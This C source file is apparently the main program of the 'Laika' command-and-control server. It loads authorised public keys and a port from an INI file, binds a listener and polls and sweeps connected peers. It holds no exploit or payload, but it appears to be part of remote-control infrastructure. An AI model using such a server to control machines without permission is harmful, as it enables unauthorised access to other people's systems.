#include "cnc.h"
#include "ini.h"
#include "lconfig.h"
#include "ltask.h"

#include <stdio.h>

#define STRING(x)      #x
#define MACROLITSTR(x) STRING(x)

struct sLaika_taskService tService;

#define MATCH(s, n) strcmp(section, s) == 0 && strcmp(name, n) == 0

static int iniHandler(void *user, const char *section, const char *name, const char *value)
{
    struct sLaika_cnc *cnc = (struct sLaika_cnc *)user;

    if (MATCH("auth", "public-key-entry")) {
        laikaC_addAuthKey(cnc, value);
    } else if (MATCH("server", "port")) {
        cnc->port = atoi(value);
    } else {
        return 0; /* unknown section/name, error */
    }
    return 1;
}

#undef MATCH

bool loadConfig(struct sLaika_cnc *cnc, char *config)
{
    int iniRes;

    printf("Loading config file '%s'...\n", config);
    if ((iniRes = ini_parse(config, iniHandler, (void *)cnc)) < 0) {
        switch (iniRes) {
        case -1:
            printf("Couldn't load config file '%s'!\n", config);
            break;
        case -2:
            printf("Memory allocation error :/\n");
            break;
        default:
            printf("Parser error on line %d in config file '%s'!\n", iniRes, config);
        }
        return false;
    }

    return true;
}

int main(int argv, char *argc[])
{
    struct sLaika_cnc *cnc;
    char *configFile = "server.ini";

    printf("Laika v" MACROLITSTR(LAIKA_VERSION_MAJOR) "."
        MACROLITSTR(LAIKA_VERSION_MINOR) "-" LAIKA_VERSION_COMMIT "\n");

    cnc = laikaC_newCNC(atoi(LAIKA_CNC_PORT));

    /* load config file */
    if (argv >= 2)
        configFile = argc[1];

    if (!loadConfig(cnc, configFile))
        return 1;

    laikaT_initTaskService(&tService);
    laikaT_newTask(&tService, 1000, laikaC_sweepPeersTask, (void *)cnc);

    /* start cnc */
    laikaC_bindServer(cnc);
    while (true) {
        laikaC_pollPeers(cnc, laikaT_timeTillTask(&tService));
        laikaT_pollTasks(&tService);
    }

    laikaT_cleanTaskService(&tService);
    laikaC_freeCNC(cnc);
    LAIKA_DEBUG("cnc killed\n");
    return 0;
}